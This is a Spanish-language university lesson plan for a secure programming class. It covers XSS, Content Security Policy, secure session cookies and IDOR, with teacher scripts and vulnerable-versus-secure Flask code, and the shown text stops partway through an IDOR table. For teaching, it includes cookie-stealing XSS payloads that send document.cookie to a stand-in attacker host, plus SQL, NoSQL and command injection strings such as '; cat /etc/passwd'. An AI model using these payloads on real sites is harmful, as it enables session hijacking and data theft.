# DOCUMENTO 1 — SESIÓN DE CLASE COMPLETA
## Universidad Autónoma del Perú | Ingeniería de Sistemas | Ciclo VIII

---

| Campo | Detalle |
|---|---|
| **Curso** | Programación Segura (DD281) |
| **Semana** | 6 |
| **Tema** | Gestión de Sesiones, XSS y Referencia Directa Insegura a Objetos (IDOR) |
| **Logro de aprendizaje** | Al finalizar la sesión, el estudiante controla variables de sesión y referencia objetos de manera segura para evitar ataques comunes con excelencia. |
| **Duración total** | 3 horas 20 minutos (con 20 min de receso) |
| **Semestre** | 2026-1 |
| **Fecha referencial** | Semana 6 del semestre 2026-1 |

---

## TABLA DE CONTENIDOS

- [CRONOGRAMA](#cronograma)
- [1. INICIO (20 min)](#1-inicio-20-min)
  - [a) Rompe-hielo (5 min)](#a-rompe-hielo-5-min)
  - [b) Logro de aprendizaje (3 min)](#b-logro-de-aprendizaje-3-min)
  - [c) Revisión sesión anterior (7 min)](#c-revisión-sesión-anterior-7-min)
  - [d) Diagnóstico inicial (5 min)](#d-diagnóstico-inicial-5-min)
- [2. UTILIDAD (10 min)](#2-utilidad-10-min)
- [3. TRANSFORMACIÓN (70 min)](#3-transformación-70-min)
  - [T1. XSS — Fundamentos y Tipos (15 min)](#t1-cross-site-scripting-xss--fundamentos-y-tipos-15-min)
  - [T2. Content Security Policy y defensa contra XSS (10 min)](#t2-content-security-policy-csp-y-defensa-contra-xss-10-min)
  - [T3. Gestión Segura de Sesiones (15 min)](#t3-gestión-segura-de-sesiones-15-min)
  - [T4. IDOR — Referencia Directa Insegura a Objetos (15 min)](#t4-idor--referencia-directa-insegura-a-objetos-15-min)
  - [T5. Relación entre XSS y Session Hijacking (10 min)](#t5-relación-entre-xss-y-session-hijacking-10-min)
  - [T6. Defensa integrada y mejores prácticas (5 min)](#t6-defensa-integrada-y-mejores-prácticas-5-min)
- [RECESO (20 min)](#receso-20-min)
- [4. PRÁCTICA (40 min)](#4-práctica-40-min)
  - [a) Caso práctico grupal (25 min)](#a-caso-práctico-grupal-25-min)
  - [b) Ejercicio individual (15 min)](#b-ejercicio-individual-15-min)
- [5. CIERRE (10 min)](#5-cierre-10-min)
- [GUION VERBAL SUGERIDO](#guion-verbal-sugerido)
- [CASOS REALES RECOMENDADOS](#casos-reales-recomendados)
- [EVALUACIÓN FORMATIVA](#evaluación-formativa)
- [REFERENCIAS APA 7](#referencias-apa-7)
- [RECURSOS REALES](#recursos-reales)

---

## CRONOGRAMA

| Bloque | Actividad | Duración | Responsable |
|---|---|---|---|
| **Bloque 1** | INICIO — Rompe-hielo | 5 min | Docente + estudiantes |
| **Bloque 1** | INICIO — Logro de aprendizaje | 3 min | Docente |
| **Bloque 1** | INICIO — Revisión sesión anterior | 7 min | Docente + estudiantes |
| **Bloque 1** | INICIO — Diagnóstico inicial | 5 min | Docente + estudiantes |
| **Bloque 1** | UTILIDAD — Por qué importa | 10 min | Docente |
| **Bloque 1** | TRANSFORMACIÓN — T1: XSS fundamentos | 15 min | Docente |
| **Bloque 1** | TRANSFORMACIÓN — T2: CSP y defensa XSS | 10 min | Docente |
| **Bloque 1** | TRANSFORMACIÓN — T3: inicio (5 min) | 5 min | Docente |
| **RECESO** | Descanso | 20 min | — |
| **Bloque 2** | TRANSFORMACIÓN — T3: Gestión Segura de Sesiones (10 min restantes) | 10 min | Docente |
| **Bloque 2** | TRANSFORMACIÓN — T4: IDOR | 15 min | Docente |
| **Bloque 2** | TRANSFORMACIÓN — T5: XSS y Session Hijacking | 10 min | Docente |
| **Bloque 2** | TRANSFORMACIÓN — T6: Defensa integrada | 5 min | Docente |
| **Bloque 2** | Cierre del bloque teórico y transición a práctica | 30 min restantes → Bloque 3 | — |
| **Bloque 3** | PRÁCTICA — Caso práctico grupal (HealthTrack) | 25 min | Estudiantes + docente |
| **Bloque 3** | PRÁCTICA — Ejercicio individual (PHP legacy) | 15 min | Estudiantes |
| **Bloque 3** | CIERRE — Síntesis colaborativa | 4 min | Docente + estudiantes |
| **Bloque 3** | CIERRE — Metacognición | 3 min | Estudiantes |
| **Bloque 3** | CIERRE — Tarea y puente S7 | 3 min | Docente |
| **TOTAL** | | **3h 20 min** | |

---

## 1. INICIO (20 min)

### a) Rompe-hielo (5 min)

**Dinámica: "El robo de identidad en 30 segundos"**

**Instrucción verbal exacta al docente:**

"Buenos días/tardes. Sin usar su computadora, quiero que en 30 segundos me respondan esta pregunta: ¿Qué información guardarían en una cookie de sesión de un banco? [pausa de 30 segundos] Ahora, si alguien robara esa cookie, ¿qué podría hacer exactamente?"

Dejar que 3-4 estudiantes respondan espontáneamente. Anotar sus respuestas en la pizarra sin corregir aún — el objetivo es capturar ideas previas, correctas o incorrectas. Decir al final: "Hoy vamos a entender exactamente cómo ocurre ese robo y cómo prevenirlo."

---

### b) Logro de aprendizaje (3 min)

**Guion verbal TEXTUAL completo:**

"El logro de hoy es: controlar variables de sesión y referenciar objetos de forma segura para evitar los ataques XSS e IDOR. Esto significa que al finalizar esta sesión ustedes serán capaces de: PRIMERO, identificar un ataque XSS en código fuente y escribir el fix en menos de 5 minutos. SEGUNDO, detectar una referencia directa insegura a objetos y corregirla con una verificación de autorización. TERCERO, configurar una sesión web con los atributos de seguridad correctos. ¿Alguien puede decirme qué significan las siglas XSS? [pausa para respuesta] Exacto — o casi. Vamos a precisarlo."

---

### c) Revisión sesión anterior (7 min)

La Semana 5 cubrió inyección SQL, NoSQL y Command Injection. Las siguientes preguntas sirven para activar conocimientos previos y conectar con los nuevos contenidos.

---

**Pregunta 1:** "¿Cuál es la diferencia entre SQL Injection y NoSQL Injection?"

**RESPUESTA ESPERADA DETALLADA:** Un estudiante que entendió bien debería responder que SQL Injection ocurre en bases de datos relacionales que usan el lenguaje SQL (como MySQL, PostgreSQL, SQLite), donde el atacante inserta código SQL malicioso en campos de entrada para manipular consultas. NoSQL Injection ocurre en bases de datos no relacionales (como MongoDB, Redis, Cassandra) que no usan SQL sino sus propios lenguajes de consulta — objetos JSON, operadores como `$gt`, `$ne`. El mecanismo de ataque es diferente: en SQLi se explotan las comillas y la sintaxis SQL; en NoSQLi se explotan los operadores del motor de BD (ej: `{"usuario": {"$ne": null}}` en MongoDB para que la condición siempre sea verdadera). La defensa también es diferente: SQLi se previene con prepared statements; NoSQLi se previene con validación estricta de tipos y esquema.

**CORRECCIÓN SI RESPONDE MAL:** Si el estudiante solo dice "uno es SQL y el otro no es SQL", profundizar: "¿Puedes darme un ejemplo de cómo se vería un payload de NoSQL Injection? ¿Qué operador especial usa MongoDB que el atacante puede explotar?"

---

**Pregunta 2:** "¿Por qué usar f-strings o concatenación de strings en una consulta SQL es peligroso?"

**RESPUESTA ESPERADA DETALLADA:** Porque el contenido del string del usuario se incorpora literalmente al código SQL antes de que el motor de base de datos lo procese. Esto significa que si el usuario ingresa `' OR '1'='1'--`, esa cadena se convierte en parte de la lógica de la consulta, modificando su comportamiento. El motor de BD no puede distinguir entre el código SQL original y el código inyectado porque llega todo como una sola cadena. Con prepared statements (consultas parametrizadas), el código SQL y los valores se envían por separado al motor de BD: el motor compila primero la estructura SQL con el placeholder (`?`), y luego reemplaza el placeholder con el valor del usuario tratándolo estrictamente como dato, haciendo imposible que el valor altere la estructura de la consulta.

**CORRECCIÓN SI RESPONDE MAL:** "Piensa en esto: el motor de BD, ¿puede saber si el apóstrofe que recibe viene del programador o del usuario? Con concatenación, no puede saberlo. ¿Cómo solucionamos eso?"

---

**Pregunta 3:** "¿Qué es Command Injection y por qué `shell=True` en Python es peligroso?"

**RESPUESTA ESPERADA DETALLADA:** Command Injection ocurre cuando el input del usuario se incorpora a un comando del sistema operativo que se ejecuta con privilegios del servidor. El atacante puede usar operadores de encadenamiento (`;`, `&&`, `|`) para ejecutar comandos adicionales. En Python, `subprocess.run(comando, shell=True)` le dice al sistema operativo que ejecute el comando a través del shell (`/bin/sh` en Linux), lo cual interpreta todos los operadores de shell. Si el comando se construye concatenando input del usuario, el atacante puede insertar `; cat /etc/passwd` y el shell lo ejecutará como un segundo comando. La solución es pasar los argumentos como lista: `subprocess.run(["ping", "-c", "2", ip])`, que no invoca el shell y trata cada elemento como un argumento literal del programa.

**CORRECCIÓN SI RESPONDE MAL:** "¿Cuál es la diferencia entre ejecutar `ping 8.8.8.8; ls` como string vs como lista `['ping', '8.8.8.8; ls']`? En el segundo caso, el punto y coma es parte del argumento, no un separador de comandos."

---

### d) Diagnóstico inicial (5 min)

Estas preguntas miden el punto de partida para los nuevos contenidos. No se evalúan — se usan para calibrar la profundidad de la explicación.

---

**Pregunta 1:** "¿Qué es una cookie HTTP y para qué sirve?"

**RESPUESTA ESPERADA DETALLADA:** Una cookie HTTP es un pequeño fragmento de datos que el servidor envía al navegador del cliente mediante el encabezado HTTP `Set-Cookie`, y que el navegador almacena localmente y reenvía automáticamente al servidor en cada solicitud subsiguiente al mismo dominio. Se usa principalmente para mantener el estado de la sesión (ya que HTTP es un protocolo sin estado): el servidor crea un identificador de sesión único (session ID), lo guarda en una cookie, y en cada request siguiente puede identificar al usuario sin que tenga que autenticarse de nuevo. También se usa para preferencias de usuario, seguimiento analítico y personalización.

**CORRECCIÓN SI RESPONDE MAL:** Si dice "es donde se guardan contraseñas", aclarar: "Las cookies no deben guardar contraseñas. Guardan identificadores. ¿Alguien puede añadir a eso?"

---

**Pregunta 2:** "¿Han escuchado el término XSS? ¿Qué creen que significa?"

**RESPUESTA ESPERADA DETALLADA:** XSS significa Cross-Site Scripting. Es un tipo de vulnerabilidad web donde un atacante logra inyectar código JavaScript (u otro script) malicioso en una página web que es servida a otros usuarios. Cuando el navegador de la víctima carga la página, ejecuta el script del atacante con los permisos de ese sitio web. Esto permite al atacante robar cookies de sesión, redirigir al usuario a páginas falsas, registrar teclas (keylogging) o modificar el contenido de la página.

**NOTA PEDAGÓGICA:** Es válido que en el diagnóstico los estudiantes no sepan la respuesta completa. El docente usa esta pregunta para medir el punto de partida, no para evaluar.

---

**Pregunta 3:** "Si un sistema de banco permite acceder a `/cuenta?id=1234` para ver el estado de cuenta, ¿qué problema de seguridad podría existir?"

**RESPUESTA ESPERADA DETALLADA:** El problema es que cualquier usuario autenticado podría cambiar el número `1234` por otro número de cuenta (ej: 1235, 1236) en la URL y potencialmente ver la información de cuentas que no le pertenecen, si el servidor no verifica que el usuario autenticado tiene autorización para ver esa cuenta específica. Esto se llama IDOR (Insecure Direct Object Reference — Referencia Directa Insegura a Objetos) y es OWASP A01:2021 (Control de Acceso Roto). La solución es que el servidor verifique siempre: "¿el usuario autenticado en la sesión activa es el propietario de la cuenta `id=1234`?"

---

## 2. UTILIDAD (10 min)

### Por qué importa en la práctica profesional

XSS es la vulnerabilidad web más reportada históricamente. Según el informe de HackerOne 2023 Bug Bounty Report, XSS fue la vulnerabilidad número 1 más reportada (23% de todos los informes). El 94% de las aplicaciones web tienen alguna forma de XSS según OWASP. Las sesiones mal gestionadas y el IDOR están en OWASP A01:2021 (Broken Access Control), la categoría número 1 más crítica desde 2021.

### Estadísticas y casos reales

- **British Airways (2018):** ataque Magecart. XSS en su sistema de pago robó datos de 500,000 tarjetas de crédito. El script malicioso fue inyectado en un widget de JavaScript de terceros que cargaba directamente en la página de pago. Multa GDPR de £20 millones (reducida de la cifra inicial de £183M).
- **Facebook (2019):** bug de IDOR permitía ver fotos privadas de cualquier usuario mediante manipulación de parámetros en la API. Recompensa de $10,000 al investigador de seguridad que lo reportó responsablemente.
- **Ticketmaster (2018):** mismo vector que British Airways. XSS persistente inyectado en un widget de soporte al cliente (Inbenta) que Ticketmaster incluía en sus páginas de pago. 40,000 tarjetas de crédito comprometidas.
- **Problemas de sesión:** el robo de session cookies (session hijacking) fue el vector de acceso inicial en el 25% de las brechas analizadas por el Verizon DBIR 2023.

### Pregunta retadora de apertura

"Si les digo que con escribir `<script>document.location='https://atacante.com?c='+document.cookie</script>` en el campo 'comentario' de un foro puedo robar la sesión de CADA usuario que lea ese comentario, sin que ellos hagan nada, sin que vean nada raro, ¿me creen? ¿Y si ese foro es el portal de su banco?"

**RESPUESTA ESPERADA:** Un estudiante que entiende el riesgo debería responder que sí, es posible si el foro no sanitiza el input. El script se almacena en la BD y se ejecuta en el navegador de cada visitante. `document.cookie` extrae las cookies del dominio del banco y las envía al servidor del atacante, quien puede usarlas para hacer session hijacking (abrir sesión como la víctima sin necesitar su contraseña). El riesgo es masivo porque un solo comentario malicioso compromete a todos los lectores.

---

## 3. TRANSFORMACIÓN (70 min)

### T1. Cross-Site Scripting (XSS) — Fundamentos y Tipos (15 min)

#### Explicación conceptual

XSS (Cross-Site Scripting) es una vulnerabilidad de seguridad web que permite a un atacante inyectar scripts del lado del cliente — generalmente JavaScript — en páginas web vistas por otros usuarios. La vulnerabilidad ocurre cuando una aplicación incluye datos del usuario en su output sin la validación o codificación adecuada. El navegador de la víctima ejecuta el script malicioso porque lo recibe desde un origen de confianza: el sitio web legítimo. XSS viola el principio de Same-Origin Policy (SOP), que es el fundamento de seguridad de los navegadores modernos.

#### Tipos de XSS

**1. XSS Reflejado (Reflected)**
El payload se incluye en la URL, el servidor lo refleja en la respuesta inmediata sin almacenarlo. Ejemplo:
```
https://sitio.com/buscar?q=<script>alert('XSS')</script>
```
Requiere que la víctima haga clic en el link malicioso. El atacante debe convencer a cada víctima individualmente (por email, redes sociales, etc.).

**2. XSS Almacenado (Stored / Persistent)**
El payload se guarda permanentemente en la base de datos del servidor (en campos de comentarios, perfiles de usuario, mensajes) y se sirve a todos los usuarios que visiten la página. Es el más peligroso porque un solo payload compromete a todos los visitantes.

**3. XSS basado en DOM (DOM-based)**
El payload no pasa por el servidor. La vulnerabilidad está en el JavaScript del cliente que manipula el DOM usando datos no sanitizados (como `location.hash` o `document.URL`). El servidor sirve una página legítima; el JS del cliente introduce el payload en el DOM.

#### Diagrama de los 3 tipos

```
REFLECTED XSS:
Atacante → Link malicioso → Víctima hace clic → Servidor recibe URL con payload
→ Servidor refleja payload en respuesta → Navegador víctima ejecuta script

STORED XSS:
Atacante → Formulario con payload → Servidor guarda en BD
→ Víctimas (todos los lectores) cargan la página → Navegador ejecuta script

DOM-BASED XSS:
Atacante → Link malicioso → Víctima hace clic → Servidor devuelve página normal
→ JS del cliente lee URL/hash → JS inserta payload en DOM → Navegador ejecuta script
```

#### Ejemplo de código vulnerable en Python/Flask

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)
comentarios_db = []  # Simula base de datos

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# VERSIÓN VULNERABLE — Stored XSS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@app.route('/comentar_inseguro', methods=['POST'])
def comentar_inseguro():
    comentario = request.form.get('comentario', '')
    # ❌ VULNERABILIDAD: guarda el HTML/JS tal como viene del usuario
    comentarios_db.append(comentario)
    return "Comentario guardado"

@app.route('/ver_inseguro')
def ver_inseguro():
    # ❌ VULNERABILIDAD: renderiza el comentario sin escapar
    # Si el comentario es <script>alert('XSS')</script>, el navegador lo ejecuta
    html = "<h1>Comentarios</h1>"
    for c in comentarios_db:
        html += f"<p>{c}</p>"  # ❌ Interpolación directa sin escape
    return html


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# VERSIÓN SEGURA — Escape de output
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

import html as html_module

@app.route('/comentar_seguro', methods=['POST'])
def comentar_seguro():
    comentario = request.form.get('comentario', '')

    # ✅ Validar longitud máxima
    if len(comentario) > 500:
        return "Comentario demasiado largo", 400

    # ✅ Guardar el texto tal cual
    # IMPORTANTE: el escape se hace al MOSTRAR, no al guardar
    comentarios_db.append(comentario)
    return "Comentario guardado"

@app.route('/ver_seguro')
def ver_seguro():
    html = "<h1>Comentarios</h1>"
    for c in comentarios_db:
        # ✅ html.escape() convierte < en &lt;, > en &gt;, " en &quot;, etc.
        # El navegador muestra el texto literal sin ejecutar como código HTML
        comentario_seguro = html_module.escape(c)
        html += f"<p>{comentario_seguro}</p>"
    return html
```

#### Tabla de caracteres peligrosos y su escape HTML

| Carácter | Significado en HTML | Escape seguro |
|---|---|---|
| `<` | Abre etiqueta HTML | `&lt;` |
| `>` | Cierra etiqueta HTML | `&gt;` |
| `"` | Delimita atributos | `&quot;` |
| `'` | Delimita atributos | `&#x27;` |
| `&` | Inicia entidad HTML | `&amp;` |
| `/` | Cierra etiquetas autocierre | `&#x2F;` |

#### Caso real: British Airways 2018

El script de Magecart (`<script src="https://baways.com/javascript/api.js">`) fue inyectado en el botón de pago de la plataforma. Durante 2 semanas capturó en tiempo real los datos de 500,000 tarjetas de crédito sin que los clientes lo supieran. El atacante comprometió un script JavaScript de terceros que British Airways incluía legítimamente en su página, convirtiendo ese script en un keylogger silencioso.

---

**PREGUNTA AL GRUPO 1:** "¿Por qué el XSS almacenado es más peligroso que el reflejado?"

**RESPUESTA ESPERADA DETALLADA:** Porque el XSS reflejado requiere que cada víctima haga clic en un link especialmente construido con el payload — el atacante debe convencer a cada víctima individualmente mediante phishing o ingeniería social. El XSS almacenado, en cambio, inyecta el script una sola vez en la base de datos del servidor y ataca automáticamente a TODOS los usuarios que visiten la página sin que el atacante tenga que hacer nada más después de la inyección inicial. Un solo comentario malicioso en un foro popular puede comprometer miles de sesiones simultáneamente. Además, el XSS almacenado es más difícil de detectar porque el payload no aparece en la URL como en el caso reflejado.

---

**MINI ACTIVIDAD T1 (3 min):** El docente muestra en proyector el string:

```html
<img src="x" onerror="fetch('https://atacante.com?c='+document.cookie)">
```

Pregunta: "¿Esto es XSS? ¿Qué hace exactamente?" Los estudiantes discuten en pareja durante 2 minutos y responden.

**Respuesta completa:** Sí, es XSS. El tag `<img>` intenta cargar la imagen "x" (que no existe). Al fallar la carga, el evento `onerror` ejecuta el JavaScript: hace una petición `fetch` al servidor del atacante con las cookies del usuario como parámetro en la URL. El servidor del atacante registra esas cookies. Es más sigiloso que `<script>` porque muchos filtros de WAF (Web Application Firewall) bloquean la etiqueta `<script>` pero no validan correctamente los event handlers en atributos HTML (`onerror`, `onload`, `onclick`, etc.).

---

### T2. Content Security Policy (CSP) y defensa contra XSS (10 min)

#### Explicación conceptual

Content Security Policy (CSP) es un estándar de seguridad web implementado como header HTTP que permite a los servidores declarar las fuentes de contenido que el navegador debe considerar legítimas y ejecutar. Es una capa de defensa adicional al escape de output: incluso si existe XSS en el HTML, el CSP puede impedir que el script se ejecute diciéndole al navegador "no ejecutes scripts que no provengan de estas fuentes autorizadas".

#### Ejemplo de header CSP

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; style-src 'self' 'unsafe-inline'; img-src *; object-src 'none'
```

Desglose de cada directiva:
- `default-src 'self'`: por defecto, solo carga recursos del mismo origen (mismo dominio, protocolo y puerto)
- `script-src 'self' https://trusted-cdn.com`: solo ejecuta scripts del propio servidor o de ese CDN específico
- `style-src 'self' 'unsafe-inline'`: permite CSS del servidor y estilos inline (necesario para muchas aplicaciones)
- `img-src *`: permite imágenes de cualquier origen
- `object-src 'none'`: bloquea completamente plugins como Flash o Java applets
- Con este CSP activo, un script `<script>alert('XSS')</script>` inline es bloqueado por el navegador aunque esté presente en el HTML

#### Implementación en Flask

```python
from flask import Flask, make_response

app = Flask(__name__)

@app.after_request
def agregar_headers_seguridad(response):
    # ✅ CSP — bloquea scripts inline y de orígenes no autorizados
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data:; "
        "object-src 'none'; "
        "frame-ancestors 'none'"   # También previene ataques de Clickjacking
    )
    # ✅ X-XSS-Protection — habilita el filtro XSS del navegador (soporte legacy)
    response.headers['X-XSS-Protection'] = '1; mode=block'
    # ✅ X-Content-Type-Options — previene MIME type sniffing
    response.headers['X-Content-Type-Options'] = 'nosniff'
    return response
```

---

**PREGUNTA AL GRUPO 2:** "¿Puede el CSP reemplazar completamente el escape de output?"

**RESPUESTA ESPERADA DETALLADA:** No. El CSP es una defensa en profundidad (defense-in-depth) pero no puede reemplazar el escape de output. Razones concretas: (1) El CSP puede tener configuraciones incorrectas o demasiado permisivas, como `'unsafe-inline'`, que permite scripts inline y anularía la protección. (2) Muchos navegadores desactualizados o clientes móviles no soportan CSP completamente. (3) El XSS puede ocurrir en contextos donde el CSP no ayuda, como dentro de atributos HTML o en eventos CSS. (4) Si los datos mal escapados se usan en contextos no-HTML (respuestas JSON, atributos de eventos), el escape HTML no es suficiente y el CSP tampoco cubre esos contextos. La estrategia correcta es: **escapar siempre el output** + agregar CSP como capa adicional. Ninguna de las dos sola es suficiente.

---

### T3. Gestión Segura de Sesiones (15 min)

#### Explicación conceptual

Una sesión web es un mecanismo que permite a una aplicación web identificar y mantener el estado de un usuario entre múltiples solicitudes HTTP. HTTP es un protocolo stateless: cada request es independiente y el servidor no recuerda requests anteriores. Las sesiones resuelven esto: al autenticarse, el servidor crea un identificador de sesión único (session ID), lo almacena en el servidor (en memoria, BD o cache), y lo envía al cliente en una cookie. En cada request siguiente, el cliente envía la cookie y el servidor identifica al usuario.

**Los ataques principales a sesiones son:**
- **Session Hijacking:** robo del session ID (mediante XSS, sniffing de red, acceso físico al dispositivo, etc.) para suplantar al usuario
- **Session Fixation:** el atacante fuerza un session ID conocido antes de que el usuario se autentique, para luego usarlo
- **CSRF (Cross-Site Request Forgery):** engaña al navegador para que envíe requests no autorizados al servidor usando la sesión activa del usuario

#### Configuración segura de cookies de sesión en Flask

```python
from flask import Flask, session, make_response, request, redirect
import secrets
import time

app = Flask(__name__)

# ✅ Clave secreta fuerte — en producción SIEMPRE desde variable de entorno
# Nunca hardcodeada en el código fuente
app.secret_key = secrets.token_hex(32)

# Configuración segura de cookies de sesión en Flask:
app.config.update(
    SESSION_COOKIE_SECURE=True,         # ✅ Solo enviar cookie por HTTPS (nunca HTTP)
    SESSION_COOKIE_HTTPONLY=True,       # ✅ Inaccesible desde JavaScript (previene robo via XSS)
    SESSION_COOKIE_SAMESITE='Strict',   # ✅ Solo enviar en requests del mismo sitio (previene CSRF)
    PERMANENT_SESSION_LIFETIME=1800,    # ✅ Sesión expira en 30 minutos de inactividad
    SESSION_COOKIE_NAME='__Secure-session'  # ✅ Prefijo __Secure- obliga al navegador a requerir HTTPS
)


@app.route('/login', methods=['POST'])
def login():
    usuario = request.form.get('usuario')
    password = request.form.get('password')

    if verificar_credenciales(usuario, password):
        # ✅ REGENERAR el session ID después de autenticación exitosa
        # Esto previene el Session Fixation Attack:
        # Si el atacante conocía el session ID antes del login, ahora ese ID es inválido
        session.clear()  # Elimina todos los datos de la sesión anterior

        # Crear nueva sesión con un nuevo session ID generado aleatoriamente por Flask
        session['usuario_id'] = obtener_id_usuario(usuario)
        session['rol'] = obtener_rol(usuario)
        session['ip_login'] = request.remote_addr    # Para validación de contexto
        session['autenticado'] = True
        session['timestamp_login'] = time.time()     # Para medir inactividad

        return redirect('/dashboard')

    # ✅ Mismo tiempo de respuesta para usuario inválido y contraseña inválida
    # Evita user enumeration via timing attacks
    return render_template('login.html', error='Credenciales inválidas'), 401


@app.route('/logout')
def logout():
    # ✅ INVALIDAR completamente la sesión en servidor y cliente
    session.clear()                              # Borra todos los datos en el lado del servidor
    response = make_response(redirect('/login'))
    response.delete_cookie('__Secure-session')   # Instruye al navegador a eliminar la cookie
    return response
```

#### Tabla comparativa de atributos de cookies de sesión

| Atributo | Valor recomendado | Qué previene | Riesgo sin él |
|---|---|---|---|
| `HttpOnly` | `True` | XSS roba la cookie con `document.cookie` | Session hijacking via XSS |
| `Secure` | `True` | Transmisión por HTTP en claro | Sniffing en redes inseguras (WiFi público) |
| `SameSite` | `Strict` | Envío en requests cross-site | CSRF attacks |
| `Max-Age / Expires` | 1800 segundos | Sesiones eternas que no expiran nunca | Acceso persistente tras compromiso inicial |
| `Path` | `/api` o ruta específica | Envío a rutas que no necesitan la cookie | Exposición innecesaria de la cookie |
| `__Secure-` prefijo | En el nombre | Bypass del atributo Secure via HTTP | Downgrade attack en cookies |

#### Error común que se debe corregir

**Error:** "HttpOnly impide que el usuario vea sus propias cookies."

**Por qué está mal:** `HttpOnly` solo impide el acceso desde JavaScript mediante `document.cookie`. El usuario puede seguir viendo las cookies desde las DevTools del navegador (pestaña Application → sección Cookies). `HttpOnly` protege específicamente contra código JavaScript malicioso (XSS) que intente leer y exfiltrar las cookies, no contra que el propio usuario las inspeccione.

---

**PREGUNTA AL GRUPO 3:** "¿Qué es Session Fixation y cómo lo previene el código del ejemplo?"

**RESPUESTA ESPERADA DETALLADA:** Session Fixation es un ataque en dos fases. Primera fase: el atacante obtiene o fuerza un session ID válido antes de que el usuario se autentique. Ejemplo de ataque: el atacante envía al usuario un link `https://banco.com/login?SESSIONID=ATACANTE_CONOCE_ESTE_ID`. Si el servidor acepta session IDs en la URL y no regenera el ID después del login, el atacante ya conoce el session ID del usuario recién autenticado. Segunda fase: el atacante usa ese session ID conocido para abrir sesión como el usuario sin necesitar sus credenciales. El código del ejemplo previene esto con `session.clear()` y la subsecuente creación de nuevos datos de sesión después de autenticación exitosa: Flask genera automáticamente un nuevo session ID aleatorio, invalidando por completo el ID anterior que pudiera conocer el atacante.

---

**MINI ACTIVIDAD T3 (3 min):** Los estudiantes reciben en papel o en pantalla esta cookie de respuesta HTTP:

```
Set-Cookie: session=abc123; Path=/
```

Deben identificar qué atributos de seguridad faltan y qué ataque posibilita cada omisión.

**Respuesta completa esperada:**
- Falta `HttpOnly` → riesgo: un script XSS puede leer `document.cookie` y robar el session ID
- Falta `Secure` → riesgo: la cookie se transmite en claro por HTTP, vulnerable a sniffing en la red
- Falta `SameSite` → riesgo: el navegador envía la cookie en requests cross-site, vulnerable a CSRF
- Falta `Max-Age` o `Expires` → riesgo: la sesión nunca expira automáticamente (solo cuando se cierra el navegador)
- El valor `abc123` es predecible y de baja entropía → debería ser un token aleatorio criptográficamente seguro de al menos 128 bits (32 caracteres hex)

---

### T4. IDOR — Referencia Directa Insegura a Objetos (15 min)

#### Explicación conceptual

IDOR (Insecure Direct Object Reference — Referencia Directa Insegura a Objetos) es una vulnerabilidad de control de acceso que ocurre cuando una aplicación usa identificadores controlables por el usuario (IDs numéricos de BD, nombres de archivo, parámetros de URL) para acceder directamente a objetos del sistema sin verificar que el usuario autenticado tiene autorización para acceder a ese objeto específico. Es parte de OWASP A01:2021 — Broken Access Control, la categoría más crítica de la lista.

#### Escenario típico

- Usuario Juan está autenticado y accede a `/api/pedido/1001` para ver su pedido
- Juan cambia la URL manualmente a `/api/pedido/1002` (pedido de María)
- Si el servidor solo verifica "¿está Juan autenticado?" pero no verifica "¿es Juan el dueño del pedido 1002?", devuelve los datos de María
- Juan acaba de leer datos de un pedido que no le pertenece sin ninguna autorización

#### Código vulnerable vs. código seguro

```python
from flask import Flask, session, jsonify, abort
import sqlite3

app = Flask(__name__)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# VERSIÓN VULNERABLE — IDOR
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@app.route('/api/pedido/<int:pedido_id>')
def obtener_pedido_inseguro(pedido_id):
    # ❌ IDOR: verifica autenticación pero NO verifica propiedad del recurso
    if not session.get('autenticado'):
        abort(401)

    conn = sqlite3.connect('tienda.db')
    cursor = conn.cursor()

    # ❌ Solo filtra por pedido_id — cualquier usuario autenticado
    # puede ver cualquier pedido cambiando el número en la URL
    pedido = cursor.execute(
        "SELECT * FROM pedidos WHERE id = ?", (pedido_id,)
    ).fetchone()

    conn.close()

    if pedido:
        return jsonify({"pedido": pedido})
    return jsonify({"error": "No encontrado"}), 404


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# VERSIÓN SEGURA — Verificación de autorización
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@app.route('/api/pedido/<int:pedido_id>')
def obtener_pedido_seguro(pedido_id):
    # ✅ Obtener el ID del usuario DESDE LA SESIÓN del servidor
    # Nunca confiar en un ID que el cliente envíe en el request
    usuario_id = session.get('usuario_id')
    if not usuario_id:
        abort(401)  # No autenticado

    conn = sqlite3.connect('tienda.db')
    cursor = conn.cursor()

    # ✅ VERIFICACIÓN DE AUTORIZACIÓN: la consulta incluye AMBAS condiciones
    # El pedido se devuelve SOLO si su id coincide Y pertenece al usuario en sesión
    # Si usuario 2 pide el pedido 1001 que pertenece al usuario 1: no encontrado
    pedido = cursor.execute(
        "SELECT id, producto, monto, estado FROM pedidos WHERE id = ? AND usuario_id = ?",
        (pedido_id, usuario_id)  # ✅ Doble verificación: ID del objeto + dueño
    ).fetchone()

    conn.close()

    if pedido:
        # ✅ Devolver solo los campos necesarios (no el usuario_id interno)
        return jsonify({
            "pedido_id": pedido[0],
            "producto": pedido[1],
            "monto": pedido[2],
            "estado": pedido[3]
        })

    # ✅ Mismo mensaje de error para "no existe" y "no es tuyo"
    # No revelar al atacante si el ID existe pero pertenece a otro usuario
    return jsonify({"error": "Pedido no encontrado"}), 404
```

#### Caso real: Facebook 2019

Un investigador de seguridad descubrió que la API de fotos de Facebook aceptaba el parámetro `photo_id` sin verificar adecuadamente si el usuario tenía permiso para ver esa foto. Enviando IDs numéricos incrementales en requests a la API, podía acceder a fotos privadas de otros usuarios. El problema fue reportado responsablemente a Facebook a través de su programa de bug bounty. Recompensa recibida: $10,000.

#### IDOR en APIs REST — tipos comunes

| Tipo de referencia | Ejemplo vulnerable | Fix recomendado |
|---|---|---|
